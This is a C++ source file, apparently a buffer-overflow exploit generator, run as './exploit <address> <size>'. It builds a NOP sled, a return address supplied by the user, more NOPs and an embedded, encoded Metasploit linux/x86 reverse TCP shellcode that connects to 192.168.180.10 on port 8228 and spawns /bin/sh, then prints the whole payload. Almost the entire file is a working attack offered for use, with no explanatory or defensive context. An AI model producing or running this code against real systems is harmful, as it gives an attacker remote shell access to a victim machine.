#include <iostream>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <string>

/*
 * linux/x86/shell_reverse_tcp - 197 bytes
 * https://metasploit.com/
 * Encoder: x86/alpha_mixed
 * VERBOSE=false, LHOST=192.168.180.10, LPORT=8228, 
 * ReverseAllowProxy=false, ReverseListenerThreaded=false, 
 * StagerRetryCount=10, StagerRetryWait=5, PrependFork=false, 
 * PrependSetresuid=false, PrependSetreuid=false, 
 * PrependSetuid=false, PrependSetresgid=false, 
 * PrependSetregid=false, PrependSetgid=false, 
 * PrependChrootBreak=false, AppendExit=false, 
 * MeterpreterDebugLevel=0, RemoteMeterpreterDebugFile=, 
 * CreateSession=true, AutoVerifySession=true, CMD=/bin/sh
 */
size_t gShellSize = 197;
unsigned char gbuf[] = 
"\xdb\xc2\xd9\x74\x24\xf4\x58\x50\x59\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41"
"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x75"
"\x61\x39\x4b\x4b\x47\x6d\x33\x70\x53\x31\x53\x66\x33\x31\x7a"
"\x64\x42\x4e\x69\x58\x61\x58\x30\x50\x66\x68\x4d\x4b\x30\x7a"
"\x33\x30\x59\x6c\x70\x57\x4f\x38\x4d\x4f\x70\x71\x59\x50\x79"
"\x48\x79\x65\x38\x4f\x30\x39\x38\x4c\x74\x34\x4a\x50\x68\x73"
"\x32\x65\x50\x65\x70\x77\x54\x6f\x79\x4d\x31\x6c\x70\x71\x76"
"\x52\x70\x53\x61\x53\x63\x4e\x53\x55\x53\x4e\x69\x4b\x51\x4a"
"\x6d\x6d\x50\x73\x62\x51\x78\x52\x4e\x76\x4f\x63\x43\x52\x48"
"\x55\x38\x64\x6f\x64\x6f\x33\x52\x71\x79\x4e\x69\x4a\x43\x50"
"\x52\x42\x73\x6b\x39\x79\x71\x48\x30\x64\x4b\x58\x4d\x6f\x70"
"\x41\x41";

int main(int argc, char * argv[])
{
  if (argc != 3) {
    std::cerr << "Usage: ./exploit <address> <size>"
    << "\n";
    exit(1);
  }
  else {
    
    std::string s(argv[1]);

    std::string hex1 = std::string(1,s[0])+s[1];    
    std::string hex2 = std::string(1,s[2])+s[3];    
    std::string hex3 = std::string(1,s[4])+s[5];    
    std::string hex4 = std::string(1,s[6])+s[7];    

    size_t size = atoi(argv[2]);
    size_t buffer = 28;

    unsigned char buf[size + gShellSize];
  
    unsigned char addr[4];
    addr[0] = std::stoi(hex4, 0, 16);
    addr[1] = std::stoi(hex3, 0, 16);
    addr[2] = std::stoi(hex2, 0, 16);
    addr[3] = std::stoi(hex1, 0, 16);

    size_t i = 0;
    while (i < size - 1) {
      buf[i++] = '\x90';
    }

    buf[i++] = addr[0];
    buf[i++] = addr[1];
    buf[i++] = addr[2];
    buf[i++] = addr[3];

    // Please don't ask

    buf[i++] = '\x90';
    buf[i++] = '\x90';
    buf[i++] = '\x90';
    buf[i++] = '\x90';

    buf[i++] = '\x90';
    buf[i++] = '\x90';
    buf[i++] = '\x90';
    buf[i++] = '\x90';

    buf[i++] = '\x90';
    buf[i++] = '\x90';
    buf[i++] = '\x90';
    buf[i++] = '\x90';

    buf[i++] = '\x90';
    buf[i++] = '\x90';
    buf[i++] = '\x90';
    buf[i++] = '\x90';

    buf[i++] = '\x90';
    buf[i++] = '\x90';
    buf[i++] = '\x90';
    buf[i++] = '\x90';

    buf[i++] = '\x90';
    buf[i++] = '\x90';
    buf[i++] = '\x90';
    buf[i++] = '\x90';

    for (size_t j = 0 ; j < gShellSize ; j++) {
      buf[i] = gbuf[j];
      i++;
    }

    for (i = 0 ; i < size + buffer + gShellSize ; i++) {
    	std::cout << buf[i];
    }
  }

  return 1;
}

